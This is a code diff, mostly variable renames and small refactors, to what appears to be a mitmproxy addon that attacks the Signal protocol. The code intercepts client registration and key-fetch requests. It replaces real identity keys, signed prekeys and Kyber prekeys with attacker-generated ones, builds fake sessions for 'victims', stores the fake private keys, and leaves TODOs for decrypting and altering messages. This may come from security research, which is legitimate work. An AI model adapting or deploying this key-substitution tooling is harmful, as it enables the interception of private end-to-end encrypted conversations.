@@ -50,13 +50,13 @@ websocket_open_state = defaultdict(PendingWebSocket)
 
 @dataclass
 class KeyData:
-    IdenKey: Optional[identity_key.IdentityKeyPair] = None
+    IdenKey: Optional[IdentityKeyPair] = None
     SignedPreKey: Optional[dict] = None
     pq_lastResortKey: Optional[dict] = None
     PreKeys: Optional[dict] = None
     pq_PreKeys: Optional[dict] = None
 
-    fake_IdenKey: Optional[identity_key.IdentityKeyPair] = None
+    fake_IdenKey: Optional[IdentityKeyPair] = None
     fake_SignedPreKeys: Optional[dict] = None
     fake_secret_SignedPreKeys: Optional[dict] = None
 
@@ -83,8 +83,8 @@ class RegistrationInfo:
 @dataclass
 class BobIdenKey:
     uuid: str
-    identityKey: Optional[identity_key.IdentityKeyPair] = None
-    fake_identityKey: Optional[identity_key.IdentityKeyPair] = None
+    identityKey: Optional[IdentityKeyPair] = None
+    fake_identityKey: Optional[IdentityKeyPair] = None
 
 
 api = addons[0]
@@ -108,8 +108,8 @@ def _v1_registration(flow: HTTPFlow):
     aci_pq_lastResortKey = req['aciPqLastResortPreKey']
     pni_pq_lastResortKey = req['pniPqLastResortPreKey']
 
-    aci_fake_IdenKey = identity_key.IdentityKeyPair.generate()
-    pni_fake_IdenKey = identity_key.IdentityKeyPair.generate()
+    aci_fake_IdenKey = IdentityKeyPair.generate()
+    pni_fake_IdenKey = IdentityKeyPair.generate()
 
     fake_signed_pre_keys, fake_secret_SignedPreKeys = helpers.create_registration(aci_fake_IdenKey, pni_fake_IdenKey)
 
@@ -205,14 +205,14 @@ def _v2_keys(flow: HTTPFlow):
     key_data.pq_PreKeys = pq_pre_keys
     key_data.PreKeys = pre_keys
 
-    fake_pre_keys, fake_secret_PreKeys = helpers.create_keys_data(100, alice_identity_key_pair)
+    fake_pre_keys, fake_secret_pre_keys = helpers.create_keys_data(100, alice_identity_key_pair)
 
     req.update(fake_pre_keys)
 
     key_data.fake_PreKeys = fake_pre_keys["preKeys"]
-    key_data.fake_secret_PreKeys = fake_secret_PreKeys["preKeys"]
+    key_data.fake_secret_PreKeys = fake_secret_pre_keys["preKeys"]
     key_data.fake_pq_PreKeys = fake_pre_keys["pqPreKeys"]
-    key_data.fake_secret_pq_PreKeys = fake_secret_PreKeys["pqPreKeys"]
+    key_data.fake_secret_pq_PreKeys = fake_secret_pre_keys["pqPreKeys"]
 
     legit_bundle = LegitBundle.insert(
         type=identity,
@@ -259,9 +259,9 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
     fake_victims = {}
     for _id, bundle in enumerate(resp["devices"]):
         # data should be uuid of Alice and the device id (in this case 1 is ok)
-        fakeVictim = MitmUser(address.ProtocolAddress("1", 1))
-        fake_victims[_id] = fakeVictim
-        bob_registartion_id = bundle["registrationId"]
+        fake_victim = MitmUser(address.ProtocolAddress("1", 1))
+        fake_victims[_id] = fake_victim
+        bob_registration_id = bundle["registrationId"]
 
         bob_kyber_pre_key_public = b64decode(bundle["pqPreKey"]["publicKey"])
         bob_kyber_pre_key_signature = b64decode(bundle["pqPreKey"]["signature"] + "==")
@@ -273,18 +273,16 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
         device_id = bundle["deviceId"]
 
         bob_bundle = state.PreKeyBundle(
-            bob_registartion_id,
+            bob_registration_id,
             address.DeviceId(_id),
             (state.PreKeyId(bundle["preKey"]["keyId"]), PublicKey.deserialize(bob_pre_key_public)),
             state.SignedPreKeyId(1),
             PublicKey.deserialize(bob_signed_pre_key_public),
             b64decode(bundle["signedPreKey"]["signature"] + "=="),
             IdentityKey(bob_identity_key_public),
-        )
-
-        bob_bundle = bob_bundle.with_kyber_pre_key(state.KyberPreKeyId(bob_kyber_pre_key_id),
-                                                   kem.PublicKey.deserialize(bob_kyber_pre_key_public),
-                                                   bob_kyber_pre_key_signature)
+        ).with_kyber_pre_key(state.KyberPreKeyId(bob_kyber_pre_key_id),
+                             kem.PublicKey.deserialize(bob_kyber_pre_key_public),
+                             bob_kyber_pre_key_signature)
 
         legit_bundle = LegitBundle.insert(
             type=identity.lower(),
@@ -297,7 +295,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
             lastResortKyber=b64encode(bob_kyber_pre_key_public).decode("ascii")
         )
         legit_bundle.on_conflict_replace().execute()
-        fakeVictim.process_pre_key_bundle(address.ProtocolAddress(uuid, _id), bob_bundle)
+        fake_victim.process_pre_key_bundle(address.ProtocolAddress(uuid, _id), bob_bundle)
 
     # TODO: Swap the prekeybundle
 
@@ -313,37 +311,37 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
 
         if not identity_key:
             # TODO: create row
-            fakeUser = MitmUser(address=address.ProtocolAddress(uuid, _id))
-            # identity_key = fakeUser.pre_key_bundle.identity_key()
-            identity_key = fakeUser.identity_key_pair
+            fake_user = MitmUser(address=address.ProtocolAddress(uuid, _id))
+            # identity_key = fake_user.pre_key_bundle.identity_key()
+            identity_key = fake_user.identity_key_pair
 
         else:
-            fakeUser = MitmUser(address=address.ProtocolAddress(uuid, _id), identity_key=identity_key.fake_identityKey)
+            fake_user = MitmUser(address=address.ProtocolAddress(uuid, _id), identity_key=identity_key.fake_identityKey)
             identity_key = identity_key.fake_identityKey
 
-        fakeBundle = fakeUser.pre_key_bundle.to_dict()
+        fake_bundle = fake_user.pre_key_bundle.to_dict()
 
-        logging.info(f"FAKE BUNDLE: {json.dumps(fakeBundle, indent=4)}")
+        logging.info(f"FAKE BUNDLE: {json.dumps(fake_bundle, indent=4)}")
 
-        fakeBundle_wire = {
+        fake_bundle_wire = {
             "identityKey": identity_key.public_key().to_base64(),
             "devices": [
                 {
                     "devicedId": 1,
-                    "registrationId": fakeBundle["registration_id"],
+                    "registrationId": fake_bundle["registration_id"],
                     "preKey": {
-                        "keyId": fakeBundle["pre_key_id"],
-                        "publicKey": fakeBundle["pre_key_public"]
+                        "keyId": fake_bundle["pre_key_id"],
+                        "publicKey": fake_bundle["pre_key_public"]
                     },
                     "signedPreKey": {
-                        "keyId": fakeBundle["signed_pre_key_id"],
-                        "publicKey": fakeBundle["signed_pre_key_public"],
-                        "signature": fakeBundle["signed_pre_key_sign"][:-2]  #
+                        "keyId": fake_bundle["signed_pre_key_id"],
+                        "publicKey": fake_bundle["signed_pre_key_public"],
+                        "signature": fake_bundle["signed_pre_key_sign"][:-2]  #
                     },
                     "pqPreKey": {
-                        "keyId": fakeBundle["kyber_pre_key_id"],
-                        "publicKey": fakeBundle["kyber_pre_key_public"],
-                        "signature": fakeBundle["kyber_pre_key_sign"][:-2]  # todo: fix this
+                        "keyId": fake_bundle["kyber_pre_key_id"],
+                        "publicKey": fake_bundle["kyber_pre_key_public"],
+                        "signature": fake_bundle["kyber_pre_key_sign"][:-2]  # todo: fix this
                     }
                 }
             ]
@@ -354,25 +352,25 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
             aci=uuid,
             deviceId=device_id,
             FakeIdenKey=(identity_key.public_key().to_base64(), identity_key.private_key().to_base64()),
-            FakeSignedPreKey=(fakeBundle_wire["devices"][0]["signedPreKey"],
-                              fakeUser.signed_pre_key_pair.private_key().to_base64()),
-            FakePrekeys=(fakeBundle_wire["devices"][0]["preKey"],
-                         fakeUser.pre_key_pair.private_key().to_base64()),
-            fakeKyberKeys=(fakeBundle_wire["devices"][0]["pqPreKey"],
-                           fakeUser.kyber_pre_key_pair.get_private().to_base64()),
-            fakeLastResortKyber=(fakeUser.last_resort_kyber.get_public().to_base64(),
-                                 fakeUser.last_resort_kyber.get_private().to_base64())
+            FakeSignedPreKey=(fake_bundle_wire["devices"][0]["signedPreKey"],
+                              fake_user.signed_pre_key_pair.private_key().to_base64()),
+            FakePrekeys=(fake_bundle_wire["devices"][0]["preKey"],
+                         fake_user.pre_key_pair.private_key().to_base64()),
+            fakeKyberKeys=(fake_bundle_wire["devices"][0]["pqPreKey"],
+                           fake_user.kyber_pre_key_pair.get_private().to_base64()),
+            fakeLastResortKyber=(fake_user.last_resort_kyber.get_public().to_base64(),
+                                 fake_user.last_resort_kyber.get_private().to_base64())
         )
         mitm_bundle.on_conflict_replace().execute()
-        mitm_bundles[_id] = mitm_bundle, fakeBundle_wire, fakeUser, fake_victims[_id]
+        mitm_bundles[_id] = mitm_bundle, fake_bundle_wire, fake_user, fake_victims[_id]
 
     keys = list(mitm_bundles.keys())
     if len(keys) < 1:
         logging.info(f"wtf bob: {resp['devices']}")
 
-    _, fakeBundle_wire, fakeUser, fakeVictim = mitm_bundles[keys[0]]
-    resp.update(fakeBundle_wire)
-    conversation_session[(ip_address, identifier)] = (fakeUser, fakeVictim)
+    _, fake_bundle_wire, fake_user, fake_victim = mitm_bundles[keys[0]]
+    resp.update(fake_bundle_wire)
+    conversation_session[(ip_address, identifier)] = (fake_user, fake_victim)
     flow.response.content = json.dumps(resp, sort_keys=True).encode()
 
 
@@ -433,19 +431,19 @@ def _v1_ws_profile(flow, identifier):
     bundle = MitMBundle.select().where(MitMBundle.type == uuid_type, MitMBundle.aci == uuid).first()
 
     if bundle:
-        public_fake_IdenKey = bundle.FakeIdenKey[0]
+        public_fake_iden_key = bundle.FakeIdenKey[0]
     else:
-        fake_IdenKey = identity_key.IdentityKeyPair.generate()
-        bobs_bundle[uuid] = BobIdenKey(uuid, iden_key, fake_IdenKey)
-        public_fake_IdenKey = b64encode(bobs_bundle[uuid].fake_identityKey.public_key().serialize()).decode("utf-8")
+        fake_iden_key = IdentityKeyPair.generate()
+        bobs_bundle[uuid] = BobIdenKey(uuid, iden_key, fake_iden_key)
+        public_fake_iden_key = b64encode(bobs_bundle[uuid].fake_identityKey.public_key().serialize()).decode("utf-8")
 
     logging.info(f"BUNDLE: {bundle}")
-    content["identityKey"] = public_fake_IdenKey
+    content["identityKey"] = public_fake_iden_key
 
     logging.info(f"content: {content}")  # TODO: what's happening here? No injection of fake identity key
 
     # TODO: right now we are altering a "pseudo-flow" -- one we created artificially from a websocket message.
-    # ideally, we will propage this further by checking if the flow was altered by the handler auto-magically.
+    # ideally, we will propagate this further by checking if the flow was altered by the handler auto-magically.
     flow.response.content = json.dumps(content).encode()
     return flow.response.content
 
@@ -475,7 +473,7 @@ def _v2_ws_message(flow, identifier):
 
         ctxt = PreKeySignalMessage()
         ctxt.ParseFromString(content)
-        logging.warning(f"ctxt from IK: {b64encode(ctxt.identity_key)}")
+        logging.warning(f"ctxt from IK: {b64encode(ctxt.identity_key).decode("ascii")}")
         logging.info(f"ctxt from IK: {ctxt}")
         # TODO: unproduf / decrypt / alter / encrypt / prodobuf 
 
